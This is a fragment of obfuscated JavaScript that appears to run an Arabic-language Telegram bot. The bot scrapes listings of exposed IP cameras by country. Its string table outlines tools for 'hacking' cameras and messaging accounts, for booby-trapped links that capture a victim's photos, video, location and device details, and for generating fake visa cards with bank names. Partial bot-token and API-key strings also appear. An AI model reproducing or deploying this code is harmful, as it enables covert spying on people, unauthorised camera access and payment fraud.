        'UY': _0x1155f9(0x1fe),
        'UZ': _0x1155f9(0x652) + _0x1155f9(0x6bc),
        'VE': _0x1155f9(0x661),
        'VN': _0x1155f9(0x5ea),
        'ZM': _0x1155f9(0x318),
        'ZW': _0x1155f9(0x615),
        'GL': _0x1155f9(0xc6),
        'KY': _0x1155f9(0x3bb) + _0x1155f9(0x4e2),
        'NI': _0x1155f9(0x46f) + _0x1155f9(0x1db),
        'DO': _0x1155f9(0x562) + _0x1155f9(0x3a4),
        'NC': _0x1155f9(0x5f1) + _0x1155f9(0x38e),
        'LA': _0x1155f9(0x58d),
        'TT': _0x1155f9(0x6d8) + _0x1155f9(0x59a),
        'GG': _0x1155f9(0x43d),
        'GU': _0x1155f9(0x6e8),
        'GP': _0x1155f9(0x19b),
        'MG': _0x1155f9(0x10d),
        'RE': _0x1155f9(0x1df),
        'FO': _0x1155f9(0x3ce),
        'MD': _0x1155f9(0x13c)
    }, camRequestCounts = {};
async function initStorage() {
    const _0x73b4db = _0x1155f9, _0x4b8a17 = { 'VVgng': _0x73b4db(0x422) };
    await storage[_0x73b4db(0x269)](), vipUsers = await storage[_0x73b4db(0x357)](_0x4b8a17[_0x73b4db(0x6c1)]) || [];
}
async function saveVipUsers() {
    const _0x185c83 = _0x1155f9, _0x125c68 = { 'AiJif': _0x185c83(0x422) };
    await storage[_0x185c83(0x172)](_0x125c68[_0x185c83(0x690)], vipUsers);
}
function showCountryList(_0x360e15, _0x18b6fe = 0x36e * 0x4 + -0x2463 + 0x1 * 0x16ab) {
    const _0x278679 = _0x1155f9, _0x5d3c5f = {
            'PScdC': function (_0x172994, _0xb3fa46) {
                return _0x172994 + _0xb3fa46;
            },
            'Ezrla': function (_0x315660, _0x21738d) {
                return _0x315660 < _0x21738d;
            },
            'ucOZk': function (_0xa892ac, _0xbe7bda) {
                return _0xa892ac > _0xbe7bda;
            },
            'MBRcg': function (_0x18fc96, _0x36038b) {
                return _0x18fc96 < _0x36038b;
            },
            'axMiu': _0x278679(0x165),
            'JOyqN': _0x278679(0x619) + 'ة:'
        };
    try {
        const _0x56b174 = [], _0x826258 = Object[_0x278679(0x5b1)](countryTranslation), _0x1c4235 = Object[_0x278679(0x697)](countryTranslation), _0x2ae041 = Math[_0x278679(0x35b)](_0x5d3c5f[_0x278679(0x320)](_0x18b6fe, 0x64b * 0x2 + -0x907 + -0xcb * 0x4), _0x826258[_0x278679(0x475)]);
        for (let _0x3f49a8 = _0x18b6fe; _0x5d3c5f[_0x278679(0x684)](_0x3f49a8, _0x2ae041); _0x3f49a8 += 0x4f * 0x2f + -0x206d + 0x11ef) {
            const _0x2e461f = [];
            for (let _0x35b02c = _0x3f49a8; _0x5d3c5f[_0x278679(0x684)](_0x35b02c, _0x5d3c5f[_0x278679(0x320)](_0x3f49a8, 0xb * -0xb1 + 0x4f * 0x34 + -0x86e)) && _0x5d3c5f[_0x278679(0x684)](_0x35b02c, _0x2ae041); _0x35b02c++) {
                const _0x12b62c = _0x826258[_0x35b02c], _0x128ac2 = _0x1c4235[_0x35b02c];
                _0x2e461f[_0x278679(0x2c2)]({
                    'text': _0x128ac2,
                    'callback_data': _0x12b62c
                });
            }
            _0x56b174[_0x278679(0x2c2)](_0x2e461f);
        }
        const _0x51e8d9 = [];
        _0x5d3c5f[_0x278679(0x3f9)](_0x18b6fe, 0x1a9a + -0x18ae + 0x1ec * -0x1) && _0x51e8d9[_0x278679(0x2c2)], _0x5d3c5f[_0x278679(0x5ce)](_0x2ae041, _0x826258[_0x278679(0x475)]) && _0x51e8d9[_0x278679(0x2c2)]({
            'text': _0x5d3c5f[_0x278679(0x532)],
            'callback_data': _0x278679(0x38b) + _0x2ae041
        }), _0x51e8d9[_0x278679(0x475)] && _0x56b174[_0x278679(0x2c2)](_0x51e8d9), bot[_0x278679(0x420) + 'e'](_0x360e15, _0x5d3c5f[_0x278679(0x49c)], { 'reply_markup': { 'inline_keyboard': _0x56b174 } });
    } catch (_0x5def75) {
        bot[_0x278679(0x420) + 'e'](_0x360e15, _0x278679(0x5f0) + _0x278679(0x1e5) + _0x278679(0x57c) + _0x5def75[_0x278679(0x641)]);
    }
}
async function displayCameras(_0x4f8927, _0x31ef9b) {
    const _0x45f912 = _0x1155f9, _0x29ecf5 = {
            'jSMOO': _0x45f912(0x6e4) + _0x45f912(0x58c) + _0x45f912(0x26f),
            'aAgei': function (_0x56e12e, _0x2b193d) {
                return _0x56e12e < _0x2b193d;
            },
            'fProY': function (_0x22b411, _0x54ce5e) {
                return _0x22b411 % _0x54ce5e;
            },
            'GjvmG': _0x45f912(0x634) + _0x45f912(0x5c0) + _0x45f912(0x37e) + _0x45f912(0x6d1) + _0x45f912(0xe2) + _0x45f912(0x552) + _0x45f912(0x4e1) + _0x45f912(0x17d) + _0x45f912(0x640) + _0x45f912(0x1ba) + _0x45f912(0x6b8) + '6',
            'bwHGp': _0x45f912(0x539) + _0x45f912(0x694) + _0x45f912(0x1f8) + _0x45f912(0x5e0) + _0x45f912(0x353) + _0x45f912(0x6c0) + _0x45f912(0x140) + _0x45f912(0x375) + _0x45f912(0x46a) + _0x45f912(0x299),
            'EJStK': function (_0x390ee3, _0x2c1a9c, _0x57d60f) {
                return _0x390ee3(_0x2c1a9c, _0x57d60f);
            },
            'WTZkr': function (_0x5c295b, _0x4b628d) {
                return _0x5c295b <= _0x4b628d;
            },
            'tvWrj': function (_0xd64e11, _0x1b90c6) {
                return _0xd64e11 < _0x1b90c6;
            },
            'kGfat': function (_0x48b98f, _0x7191c0) {
                return _0x48b98f + _0x7191c0;
            },
            'ztnIi': _0x45f912(0x260) + _0x45f912(0x694) + _0x45f912(0x1f8) + _0x45f912(0x4ac) + _0x45f912(0x160) + _0x45f912(0x270) + _0x45f912(0x4ce) + _0x45f912(0x56d) + _0x45f912(0x3a8) + _0x45f912(0x14a) + _0x45f912(0x398) + _0x45f912(0x179) + _0x45f912(0x37a) + _0x45f912(0x686) + _0x45f912(0x51f) + _0x45f912(0x204) + _0x45f912(0x65e) + _0x45f912(0x358) + _0x45f912(0x2c4),
            'zcwnU': _0x45f912(0x539) + _0x45f912(0x694) + _0x45f912(0x1f8) + _0x45f912(0x5e0) + _0x45f912(0x353) + _0x45f912(0x4e6) + _0x45f912(0x255) + _0x45f912(0x631) + _0x45f912(0x3d0) + _0x45f912(0x1a2)
        };
    try {
        const _0x120719 = await bot[_0x45f912(0x420) + 'e'](_0x4f8927, _0x29ecf5[_0x45f912(0x4a5)]), _0x3bfb42 = _0x120719[_0x45f912(0x10f)];
        for (let _0x4ecc60 = -0x5 * -0x7bb + -0x41b + -0x228c; _0x29ecf5[_0x45f912(0x6c5)](_0x4ecc60, -0x823 + 0x112e + -0x8fc); _0x4ecc60++) {
            await bot[_0x45f912(0x4ff) + _0x45f912(0x62b)](_0x45f912(0x6e4) + _0x45f912(0x58c) + _0x45f912(0x52d) + '.'[_0x45f912(0x4b3)](_0x29ecf5[_0x45f912(0x597)](_0x4ecc60, 0x3 * -0xb23 + -0x1 * -0x15f6 + 0xb77)), {
                'chat_id': _0x4f8927,
                'message_id': _0x3bfb42
            }), await new Promise(_0x9d570b => setTimeout(_0x9d570b, -0x465 + -0x18a6 + -0x4b5 * -0x7));
        }
        const _0x4574f7 = _0x45f912(0x6e0) + _0x45f912(0x338) + _0x45f912(0x1dc) + _0x45f912(0x6bd) + _0x31ef9b, _0x3d430e = { 'User-Agent': _0x29ecf5[_0x45f912(0x52b)] };
        let _0x3580a2 = await axios[_0x45f912(0x45b)](_0x4574f7, { 'headers': _0x3d430e });
        const _0x42e474 = _0x3580a2[_0x45f912(0x628)][_0x45f912(0x1ca)](/pagenavigator\("\?page=", (\d+)/);
        if (!_0x42e474) {
            bot[_0x45f912(0x420) + 'e'](_0x4f8927, _0x29ecf5[_0x45f912(0x4cb)]);
            return;
        }
        const _0x5449a6 = _0x29ecf5[_0x45f912(0x48f)](parseInt, _0x42e474[0x4a2 + -0x5bf + 0x8f * 0x2], -0x9 * -0xb3 + -0x20ee + 0x1 * 0x1aad), _0x139903 = [];
        for (let _0x2f2115 = -0x1253 * -0x1 + -0x1ece * 0x1 + 0xc7c; _0x29ecf5[_0x45f912(0x25d)](_0x2f2115, _0x5449a6); _0x2f2115++) {
            _0x3580a2 = await axios[_0x45f912(0x45b)](_0x4574f7 + _0x45f912(0x395) + _0x2f2115, { 'headers': _0x3d430e });
            const _0x149c68 = _0x3580a2[_0x45f912(0x628)][_0x45f912(0x1ca)](/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            _0x139903[_0x45f912(0x2c2)](..._0x149c68);
        }
        if (_0x139903[_0x45f912(0x475)]) {
            const _0x35c83c = _0x139903[_0x45f912(0x43b)]((_0x1eda24, _0x3d1369) => _0x3d1369 + (0x18b8 + -0xe * -0x2c2 + -0x3f53) + '.\x20' + _0x1eda24);
            for (let _0x314ef1 = 0xbe + 0x16 * 0xc9 + -0x481 * 0x4; _0x29ecf5[_0x45f912(0x2b3)](_0x314ef1, _0x35c83c[_0x45f912(0x475)]); _0x314ef1 += 0x2c2 + -0x6e5 + 0x455) {
                const _0x37ee5f = _0x35c83c[_0x45f912(0x1d6)](_0x314ef1, _0x29ecf5[_0x45f912(0x632)](_0x314ef1, -0x1c00 + 0x1 * 0x1fe7 + -0x3b5));
                await bot[_0x45f912(0x420) + 'e'](_0x4f8927, _0x37ee5f[_0x45f912(0x33d)]('\x0a'));
            }
            await bot[_0x45f912(0x420) + 'e'](_0x4f8927, _0x29ecf5[_0x45f912(0x45f)]);
        } else
            await bot[_0x45f912(0x420) + 'e'](_0x4f8927, _0x29ecf5[_0x45f912(0x159)]);
    } catch (_0x43970a) {
        await bot[_0x45f912(0x420) + 'e'](_0x4f8927, _0x45f912(0x539) + _0x45f912(0x694) + _0x45f912(0x1f8) + _0x45f912(0x5e0) + _0x45f912(0x353) + _0x45f912(0x4e6) + _0x45f912(0x255) + _0x45f912(0x631) + _0x45f912(0x3d0) + _0x45f912(0x1a2));
    }
}
function isDeveloper(_0x6441af) {
    const _0x52c55d = _0x1155f9, _0x4faedd = {
            'zMaJl': function (_0x432bb4, _0x292ee3) {
                return _0x432bb4 === _0x292ee3;
            }
        }, _0x8a0357 = 0x18ffc81c9 + 0xbc7cc600 + -0x3f95 * 0x3e013;
    return _0x4faedd[_0x52c55d(0x1d5)](_0x6441af, _0x8a0357);
}
function showAdminPanel(_0x4ea2b5) {
    const _0x5ce480 = _0x1155f9, _0x3535f4 = {
            'vJauY': _0x5ce480(0x30c) + 'م:',
            'KQxDs': _0x5ce480(0x6a6) + _0x5ce480(0x411),
            'wUkyy': _0x5ce480(0x636),
            'rYCDR': _0x5ce480(0x114) + _0x5ce480(0x411),
            'FeiDP': _0x5ce480(0x413)
        };
    bot[_0x5ce480(0x420) + 'e'](_0x4ea2b5, _0x3535f4[_0x5ce480(0x2d4)], {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x3535f4[_0x5ce480(0x595)],
                        'callback_data': _0x3535f4[_0x5ce480(0x285)]
                    }],
                [{
                        'text': _0x3535f4[_0x5ce480(0x1ab)],
                        'callback_data': _0x3535f4[_0x5ce480(0x60f)]
                    }]
            ]
        }
    });
}
function _0x20bb() {
    const _0x5951e1 = [
        'لام\x20أي\x20رسا',
        'جنوب\x20أفريق',
        '*\x20[BOT](t.',
        'qKnsQ',
        'city',
        'هذا\x20لفتح\x20أ',
        'oWTCs',
        'isCharging',
        'اختراق\x20ببج',
        'تجرام\x20🖥',
        'Vvndh',
        'zWRpq',
        'ر\x20لتوليد\x20ر',
        'ل\x20بنجاح:\x0a<',
        'XKbYN',
        'TeySd',
        'روسيا\x20🇷🇺',
        'في\x20هذا\x20الد',
        '&duration=',
        '<strong>قم',
        'wCXUF',
        'chatId=',
        'lytPq',
        '▓▓▓▓▓▓░░░░',
        'تفادة\x20من\x20ا',
        '@lTV_l',
        'طة.\x0a:\x20http',
        'فيتنام\x20🇻🇳',
        'اختراق\x20تيك',
        'sion',
        'token',
        'ضغط\x20على\x20هذ',
        'يه\x20عبر\x20راب',
        'حدث\x20خطأ\x20أث',
        'كاليدونيا\x20',
        'سحب\x20جميع\x20ا',
        'deviceType',
        'اختراق\x20سنا',
        'SETVO',
        '👨🏻‍🏫',
        'wjgOx',
        'اختراق\x20اله',
        'BbscU',
        'لوكسمبورغ\x20',
        'answerCall',
        'إيران\x20🇮🇷',
        ':AAELOAVm0',
        'حساب\x20جديد⚠️',
        'mOUEm',
        '/:userId',
        'Agent',
        'deviceInfo',
        'Data',
        '2120560zUhiaB',
        '📸الصورة\x20',
        'RrdHU',
        'Received\x20d',
        'Vgaiz',
        'jOPxs',
        'RRNak',
        'بط\x20جديد\x20',
        '=\x0a[-]\x20by\x20:',
        'صل\x20لي30$\x20س',
        'dtUgn',
        'FeiDP',
        's://t.me/',
        'ها\x20رقمي\x20ول',
        '2DOs-Fgdwp',
        '/getName',
        '.com/',
        'زيمبابوي\x20🇿🇼',
        'السودان\x20🇸🇩',
        'NFtiE',
        'ewFaC',
        'اختر\x20الدول',
        'Dkfny',
        'iwZsU',
        'bcgGV',
        'https://t.',
        'c.html',
        'creator',
        'user_id',
        'ync',
        'تصوير\x20بدقه',
        'jGHEa',
        'NlCJW',
        'ميانمار\x20🇲🇲',
        'GnQrQ',
        'lstatSync',
        'data',
        'total_coun',
        'ر\x20لجمع\x20معل',
        'eText',
        'buffer',
        '\x20الذكاء\x20ال',
        'NQwgs',
        'dwNgt',
        'الإكوادور\x20',
        'خره\x20او\x20حاو',
        'kGfat',
        'ال\x20رابط\x20صح',
        'Mozilla/5.',
        '/submitPho',
        'add_vip',
        '\x20الاتصال.',
        'fEbgy',
        'lution',
        'VqZDv',
        'rshq_tikto',
        'وامر\x20اخترا',
        '`\x0a*=======',
        'jOwsv',
        'SNfnS',
        '\x20Chrome/11',
        'message',
        '\x20🔞',
        'nJNHL',
        '/ok.html',
        'path',
        'stFVA',
        '🇬🇹',
        '\x20يتم\x20إنشاء',
        'س\x20لديك\x20ايم',
        'CObTi',
        '\x0a𝗣𝗮𝘀𝘀𝗲𝗱\x20✅\x0a',
        'hJCiK',
        '10mb',
        'k.glitch.m',
        'ck/',
        'بوتسوانا\x20🇧🇼',
        'rrXBL',
        'أوزبكستان\x20',
        '\x20🇨🇮',
        'linkId',
        'getUserPro',
        'لإيماءات\x20ا',
        'تركمانستان',
        '257324aPQUeo',
        'بك\x20سوف\x20تحص',
        'أفغانستان\x20',
        'app/',
        'yrqXX',
        'xYolf',
        'و\x20حاول\x20مره',
        '\x20آخر\x20تحديث',
        '\x27m*\x20[™](t.',
        'فنزويلا\x20🇻🇪',
        'ياء\x20🧠',
        '\x20as\x20expect',
        'Frequency',
        'No\x20visa\x20da',
        'get_link_',
        'ated-drift',
        'VTMXP',
        'قتة:',
        'get_love_m',
        'zOVSm',
        'qJVaV',
        'Wowgx',
        'ZNYkj',
        'NCuoq',
        'بوليفيا\x20🇧🇴',
        'أنغولا\x20🇦🇴',
        '/submitLoc',
        'Juaez',
        'get_camera',
        'deviceVers',
        'kFDHQ',
        'hing\x20love\x20',
        '/g.html?ch',
        'DFiCm',
        'ain\x20later.',
        'ول\x20الي\x20الر',
        'اتباع\x20الأو',
        'AuhaU',
        'KvYlM',
        'uploads',
        'daVAK',
        '*[-]\x20Card\x20',
        'kFsDs',
        'Oqyre',
        'Ezrla',
        'المدفوع\x20تل',
        'لبت\x20باسورد',
        'rong>\x0a\x20\x20\x20\x20',
        'networkTyp',
        'filePhotos',
        'لرابط\x20لختر',
        '/imageRece',
        'خص\x20في\x20الدخ',
        'osVersion',
        'اق\x20وتساب\x0a:',
        'يا\x20🇿🇦',
        'AiJif',
        'IhWdz',
        'NViFH',
        '\x20🖥️\x0a-\x20إصدار',
        'راق\x20كامراة',
        'er.glitch.',
        'ram-bot-ap',
        'values',
        'ifRRz',
        'رابط\x20هذا:\x20',
        'ChzUJ',
        '\x20كاميرات\x20ا',
        'تم\x20إرسال\x20ا',
        'dQjgi',
        'express',
        'post',
        'بوك\x20🔮',
        'utePr',
        'phoneNumbe',
        '▓▓░░░░░░░░',
        'sendVideo',
        'o\x20for\x20chat',
        'إضافة\x20مستخ',
        'firstName',
        'الرجاء\x20إرس',
        'لموقع\x20الجغ',
        'email',
        'رابط\x20جمع\x20ا',
        'تم\x20انشاء\x20ا',
        'غواتيمالا\x20',
        'قر\x20على\x20الز',
        'first_name',
        'لاتفيا\x20🇱🇻',
        'YHtYl',
        'جورجيا\x20🇬🇪',
        'وبية\x20🇰🇷',
        'mdRZqoXRZ_',
        'username',
        'MJSmF',
        'ة:</strong',
        'fari/537.3',
        'خطأ.',
        '/s.html?ch',
        'UxGvz',
        '🇺🇿',
        'untry/',
        'email\x0a\x0aلظه',
        'tor',
        'وة\x20الامان\x20',
        'VVgng',
        'امريكا\x20🇺🇸',
        'topre',
        '\x20أي\x20إيميل\x20',
        'aAgei',
        'ليتوانيا\x20🇱🇹',
        'PTSvO',
        'g.html',
        'gMaVk',
        'تلغيم\x20رابط',
        '/record/:l',
        'neNumber',
        'التحكم:',
        'يد\x20وهمي\x20لا',
        'SIGHUP',
        'nvite',
        'Win64;\x20x64',
        'الرجاء\x20الا',
        'uploads/',
        '*الاسم\x20:\x20',
        'لبوت.',
        'Exlpx',
        '🇦🇷',
        'ترينيداد\x20و',
        'مرحبًا\x20بك\x20',
        'ط\x20🔒',
        'Bearer\x20sk-',
        'fe.html',
        'تايوان\x20🇹🇼',
        'add_names',
        '\x20https://t',
        'http://www',
        '*اليوزر\x20:\x20',
        'RoWpj',
        'VEnSD',
        'جاري\x20اخترا',
        '5Iw5wkVItL',
        'الية\x20🇰🇵',
        'catch',
        'غوام\x20🇬🇺',
        '-\x20نوع\x20الات',
        'rdeSD',
        'صيد\x20فيزات\x20',
        '/whatsapp?',
        'ryjQq',
        'SIGTERM',
        'ABQpy',
        'ijJQt',
        'خال\x20رقم\x20ال',
        'باع\x20هذه\x20ال',
        'bOndK',
        'المجلد\x20غير',
        '🇰🇿',
        'screenReso',
        'peSRN',
        'OovcN',
        'م\x20مستخدم',
        'xYoaD',
        '\x20:*\x20`',
        '/email/',
        '\x20موجود:\x20',
        '/messages',
        '/getNam',
        '241847xSuMSp',
        'يل\x20بعد\x20🗳</',
        'split',
        'سنغافورة\x20🇸🇬',
        'لقد\x20تم\x20وصو',
        'n.html',
        'يه\x20الاصيله',
        'غرينلاند\x20🇬🇱',
        '<strong>•\x20',
        'ه\x20يمنيه\x20قص',
        'اختراق\x20الم',
        'أخرى\x20لاحق😁',
        'ription\x20st',
        'GvJnx',
        'elqXL',
        '🇭🇰',
        'tKLFt',
        'IdWNl',
        'كازاخستان\x20',
        '</strong>',
        'U.S.\x20Bank',
        '\x20انشاء\x20ايم',
        'get_joke',
        '\x20المحظور\x20م',
        'مرحبًا!\x20هذ',
        'ميله\x20ومحرج',
        'almunharif',
        'HTML',
        'السنغال\x20🇸🇳',
        'secondName',
        'securityPr',
        'TCEnH',
        'وف\x20يتم\x20فتح',
        'eo:',
        'Number\x20:*\x20',
        ')\x20AppleWeb',
        'ار\x20الايمل\x20',
        'json',
        'captureFro',
        'افته\x20كـ\x20VI',
        'ErXUc',
        'deo',
        '\x20📱\x0a-\x20الذاك',
        'qJxgL',
        '/captureBa',
        'هندوراس\x20🇭🇳',
        '.temp-mail',
        'params',
        'ank',
        'Frdkl',
        'nauCe',
        'on/:linkId',
        'IlAoE',
        'ASKpp',
        'بنما\x20🇵🇦',
        '\x0aلحذف\x20الاي',
        'DDbrr',
        'file_id',
        '\x20\x20\x20\x20',
        'lvxuZ',
        'on/',
        'اك\x20VIP',
        'o\x20]</stron',
        'إثيوبيا\x20🇪🇹',
        'اصطناعي\x20🤖',
        'WvIzw',
        'QBTWn',
        'IqjLt',
        'حدثت\x20مشكلة',
        'اختراق\x20وات',
        'rbo',
        'ر\x20مجاناً:',
        '/ca.html',
        'اقع\x20💣',
        '\x20فاير\x20👾',
        'البحرين\x20🇧🇭',
        'معلومات\x20حس',
        'LovZl',
        'مدغشقر\x20🇲🇬',
        'حدث\x20خطأ',
        'message_id',
        '\x20كـ\x20VIP.',
        ']\x200%',
        'from',
        'لة\x20حالياً',
        'إزالة\x20مستخ',
        '7oxkoPuxqz',
        'ZBaJN',
        '\x20IP:\x20',
        '\x20📡\x0a-\x20إمكان',
        '\x20الجهاز:\x20',
        'Failed\x20to\x20',
        'bluetoothS',
        'رقم\x20في\x20وتس',
        'gulfo',
        '\x20إلى\x20التلغ',
        'أيرلندا\x20🇮🇪',
        'تم\x20استلام\x20',
        'تم\x20حذف\x20الذ',
        'موناكو\x20🇲🇨',
        'تفسير\x20الأح',
        'subject',
        '\x0a<code>',
        'الفلبين\x20🇵🇭',
        'معرفة\x20رقم\x20',
        'every',
        'eiefK',
        'تم\x20إضافة\x20ا',
        '/start',
        'chat',
        'لرقام\x20الضح',
        'مرحبًا!\x20ان',
        'rest-plaus',
        'البرازيل\x20🇧🇷',
        'ektRC',
        'امرا\x20الأما',
        'i.internal',
        'ZII0_bot',
        'ود\x20هاذا\x20ال',
        'ydmai',
        'التواصل\x20مع',
        '؟:\x20',
        'تم\x20إنشاء\x20ا',
        'sendFile',
        '\x20و\x20',
        'مولدوفا\x20🇲🇩',
        'nIFNr',
        'المطور\x20قبل',
        'beqat',
        'جرب\x20دوله\x20م',
        'UQlVm',
        '*Hi\x20Bro,\x20I',
        'اختراق\x20كام',
        'ل\x20على1$\x20\x0a:',
        'PwEyF',
        'ZhJYh',
        'م\x20في\x20طلب\x20ك',
        '\x20Visa...\x0a[',
        'ي\x20🕹',
        '\x20مهمه\x20اذا\x20',
        '🇨🇲',
        'سحب\x20جميع\x20ر',
        'ماليزيا\x20🇲🇾',
        'ORoMf',
        'فلسطين\x20🇵🇸',
        'سوريا\x20🇸🇾',
        'ر:\x20',
        'تم\x20حذف\x20الم',
        'ماكاو\x20🇲🇴',
        'CLASSIC',
        'stringify',
        'ont/',
        'boid-outst',
        'xovpt',
        'zcwnU',
        'كرواتيا\x20🇭🇷',
        'لآن\x20',
        'Wells\x20Farg',
        'كينيا\x20🇰🇪',
        'exit',
        'قاط\x20وفتحها',
        'وله\x20يمكنك\x20',
        'inkId',
        'ه\x20عبر\x20رابط',
        '\x20النكتة.\x20ا',
        'ا\x20الخيارت\x20',
        'المزيد',
        'اكرة\x20المؤق',
        '/capture?c',
        '*\x0a\x0a',
        'WHkAj',
        '\x20\x22https\x22.',
        'تم\x20إزالة\x20ا',
        't)\x0a\x20\x20\x20\x20\x20\x20',
        'veLmT',
        'me/)\x20\x0a*Pre',
        'شاءه\x20\x20/an\x0a',
        'MyGZV',
        'sendLocati',
        'setItem',
        '.png',
        '\x20sent\x20phot',
        'images',
        'باكستان\x20🇵🇰',
        'SMuBS',
        '@uiit89',
        'كامرات\x20في\x20',
        'lzFun',
        'axios',
        'الكاميرون\x20',
        'ike\x20Gecko)',
        '⚠️:\x0a',
        'لا\x20توجد\x20نب',
        '?start=',
        'WfaBr',
        'iSIHC',
        'i.html',
        '\x20الجهاز:',
        'iWYvF',
        'ألمانيا\x20🇩🇪',
        'QJkKR',
        'n/json',
        's.html',
        'single',
        'qhvlt',
        'd\x20Type\x20:*\x20',
        'رابط\x20تجميع',
        'RnlxC',
        'internalSt',
        '/ios',
        'أوامر\x20للاس',
        'AoLkk',
        'صال:\x20',
        'ليبيا\x20🇱🇾',
        'atus:',
        '/submitVid',
        'Invalid\x20re',
        'status',
        '\x20لشركة\x20وتس',
        'ercpQ',
        'غوادلوب\x20🇬🇵',
        'موزمبيق\x20🇲🇿',
        'كمبوديا\x20🇰🇭',
        'LZswm',
        'rshq_insta',
        '59340FaJspd',
        'الملفات\x20ال',
        '\x20لاحقًا.',
        'ojfEQ',
        'يمل...</st',
        'ال\x20معلومات',
        'process\x20vi',
        'EjmCV',
        'للمسية:\x20',
        'اب\x20سريعاً\x0a',
        'bsSHw',
        'rYCDR',
        'لهاتف:\x20',
        'يره\x20جداً\x20ب',
        'ساب\x20🟢',
        'k.html',
        'منتهى\x20قم\x20ف',
        '<strong>اه',
        'GkGLz',
        'fetch\x20visa',
        'dDROP',
        'KsXfC',
        'مالي\x20🇲🇱',
        'CZHjv',
        'الصوره🙋‍♂️\x20',
        '▓▓▓▓▓▓▓▓▓▓',
        '0.0.0.0\x20Sa',
        'emails.jso',
        'أسماء\x20المس',
        'gczeK',
        'خاص\x20بك\x0a\x20عن',
        'التردد\x20للا',
        's\x20for\x20chat',
        'agram',
        '\x20مجاني.',
        '\x20تم\x20إنشاؤه',
        'إختراق\x20ببج',
        'ة\x20الاتصال',
        'brQGp',
        'lo.html',
        'HkCnB',
        'fhQAU',
        'match',
        'إسبانيا\x20🇪🇸',
        'vsoGk',
        'create_ema',
        'TRXRR',
        'substring',
        'Fifth\x20Thir',
        'vquoq',
        'rMOnR',
        'ytUGJ',
        'YGteT',
        'zMaJl',
        'slice',
        'ApBVt',
        'HmKmy',
        '\x20تجميع\x20الن',
        'لمعلومات:\x20',
        '🇳🇮',
        'rg/en/byco',
        'تشيلي\x20🇨🇱',
        'غط\x20على\x20الز',
        'ريونيون\x20🇷🇪',
        'IvixX',
        '░░░░░░░░░░',
        '🔗\x20توليد\x20را',
        'ط\x20خمس\x20مرات',
        'XaAJP',
        'ناء\x20إنشاء\x20',
        'start=',
        'الكويت\x20🇰🇼',
        'اختراق\x20فري',
        'j1u7p1lXXG',
        ':\x20\x0a\x20اليوزر',
        'hbXdF',
        'ومات\x20جهازك',
        'random',
        'ation',
        'me/VlP_12',
        'Chase\x20Bank',
        'د\x20الأنوية:',
        'بـ\x20\x22https\x22',
        'ShulU',
        'XDfMR',
        'tos',
        'لعبة\x20الأذك',
        'UMwvw',
        '\x20المراقبه\x20',
        'Received\x20p',
        'لقد\x20قام\x20ضح',
        'اتك\x20[\x20/inf',
        'Error\x20fetc',
        'vgUSy',
        'أوروغواي\x20🇺🇾',
        'بط\x20دعوة',
        'NxaZI',
        'DxsIo',
        '\x0aلعرض\x20الرس',
        '`\x0a*[-]\x20Car',
        'ر\x20الدوله\x20ا',
        'TRlDB',
        '\x20عاليه\x20🖼',
        'randomByte',
        'لشاشة:\x20',
        'cpuCores',
        'رام.',
        '🇪🇨',
        'ك\x20VIP',
        'مالطا\x20🇲🇹',
        'book',
        'صله\x20اضع\x20في',
        'hotos:\x20',
        'رة\x20الداخلي',
        'bmVAk',
        'FoGNu',
        'NFufL',
        '/getNameFo',
        'الته\x20من\x20VI',
        'rmdirSync',
        'AoaPk',
        'و\x20🎥',
        'jwbrV',
        'unlinkSync',
        'ytSQk',
        'UpISO',
        'ing\x20video:',
        'xx.html',
        'فذ\x20',
        'ZqcnV',
        '🇵🇷',
        'vsvDK',
        'isDirector',
        'اختراق\x20فيس',
        'iPBca',
        'نامج\x20وحذف\x20',
        'vWVAC',
        'SNyqk',
        'رومانيا\x20🇷🇴',
        '\x20✋\x0a\x20\x20\x20\x20\x20\x20\x20',
        'ابط\x20دعوة.',
        '\x20الجهاز',
        'اكتب\x20لي\x20رس',
        ']\x2075%',
        'ابط\x20الخاص\x20',
        'tDBis',
        'alSkf',
        '/Messages\x0a',
        '100mb',
        'جمع\x20معلوما',
        'text',
        'شخص\x20جديد\x20د',
        'فرمتة\x20جوال',
        'connection',
        'حاولة\x20مرة\x20',
        'مستخدم\x20لإز',
        '\x20الثانية)\x0a',
        'اعطيني\x20نكت',
        'then',
        'isaMl',
        'file',
        'Generate\x20V',
        'الضحيه\x20📲',
        'forEach',
        'مرحبًا!\x20بك',
        'rZOwu',
        'كولومبيا\x20🇨🇴',
        'تم\x20لغيم\x20ال',
        'aHzCs',
        'ache...',
        'ZCEyf',
        'QjsLw',
        'هولندا\x20🇳🇱',
        'https://mo',
        'إندونيسيا\x20',
        'HGGdR',
        'تم\x20التحقق\x20',
        '\x20الصور',
        'لألوان:\x20',
        'CgDcc',
        'تخدمين:\x20',
        'جرب\x20دوله\x20ا',
        'مستخدم\x20لإض',
        '`\x0a*[-]\x20Exp',
        '\x20رابط\x20لالت',
        'An\x20error\x20o',
        ']\x2050%',
        '\x20🌍\x0a-\x20الدعم',
        'q.whatsapp',
        'WTZkr',
        'بنغلاديش\x20🇧🇩',
        'ذا\x20الرابط\x20',
        'لقد\x20تم\x20اخت',
        '*👤\x20معلومات',
        'content',
        '85645YSsoRy',
        '🇨🇷',
        'sruPZ',
        '\x20🔄\x0a-\x20عمق\x20ا',
        'beGyN',
        'YMmXn',
        'init',
        'eoDqb',
        'ستخدمين.',
        '>\x0a\x0aلنشا\x20اي',
        'gpt-3.5-tu',
        'ائل\x20للحصول',
        'راقبه.....',
        'التمتع\x20في\x20',
        'منغوليا\x20🇲🇳',
        'ي\x20عن\x20طريق\x20',
        'JNJSV',
        '<strong>حد',
        '\x20ميغابت\x20في',
        'me/gsusgsg',
        'MmigK',
        'بعد</stron',
        'ujgJj',
        'بك!\x20لديك\x20ا',
        'ل\x20عن\x20800حر',
        'أذربيجان\x20🇦🇿',
        'يرجى\x20إرسال',
        'لم\x20يتم\x20الت',
        'المجر\x20🇭🇺',
        'contact',
        '\x20للمتصفح:\x20',
        'ث\x20خطأ\x20أثنا',
        '\x20📜\x0a-\x20نوع\x20ا',
        'Id\x20',
        'wUkyy',
        'مرحبا!\x20في\x20',
        'بلوتوث:\x20',
        'vooRh',
        '\x20استخدام\x20ا',
        'k\x20:*\x20`',
        '\x20كل\x20الازرا',
        'بتجميعها:\x20',
        'ي\x20في\x20لوحة\x20',
        'لرابط\x20إليك',
        'language',
        'BnfZV',
        'max',
        'مؤقتة.',
        'إستونيا\x20🇪🇪',
